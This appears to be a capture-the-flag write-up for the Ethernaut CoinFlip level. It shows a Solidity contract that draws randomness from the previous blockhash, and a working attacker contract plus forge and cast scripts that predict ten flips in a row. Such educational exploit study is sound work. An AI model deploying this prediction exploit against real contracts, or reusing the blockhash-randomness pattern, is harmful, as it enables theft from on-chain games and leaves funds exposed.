## CoinFlip Level Outline

**Difficulty : 3/10**

This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

```solidity  
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

[Link to level on Ethernaut](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008)

## Solution
Because the flip is calculated onchain using the previous blockhash, we can predict what the outcome will be by simulating the coinflip on our custom smart contract and submitting the result.

### Walkthrough

##### 1. Create a new [forge project](https://book.getfoundry.sh/projects/creating-a-new-project.html) with the following contract in `src` 
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import 'openzeppelin-contracts/contracts/utils/math/SafeMath.sol';

contract FortuneTeller {
    using SafeMath for uint256;
    CoinFlip coinFlip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlip) {
        coinFlip = CoinFlip(_coinFlip);
    }

    function predictFuture() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        bool prediction = blockValue.div(FACTOR) == 1 ? true : false;

        coinFlip.flip(prediction);
    }
}

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}
```

##### 2. Deploy our new contract
```console
forge create src/Contract.sol:FortuneTeller --constructor-args $LEVEL_ADDRESS --private-key  $PRIVATE_KEY
```

##### 3. Create a simple bashscript to flip the coin 10 times
```console
touch flip.sh
```
add the following bash script to `flip.sh`
```bash
#!/bin/bash
for i in {1..10}
do
    cast send $DEPLOYED_ADDRESS "predictFuture()" --gas 80000 --private-key $PRIVATE_KEY
    sleep 20s
    echo Correct Flips : $i
done
```
> Replace $DEPLOYED_ADDRESS with the address of your deployed contract

##### 4. Run `flip.sh`
```console
chmod 777 flip.sh
./flip.sh
```

## Further Reading
How to avoid generating numbers onchain by using [Chainlink VRF](https://docs.chain.link/docs/get-a-random-number)


---

##### [:arrow_left: Back To Main Menu](../README.md)
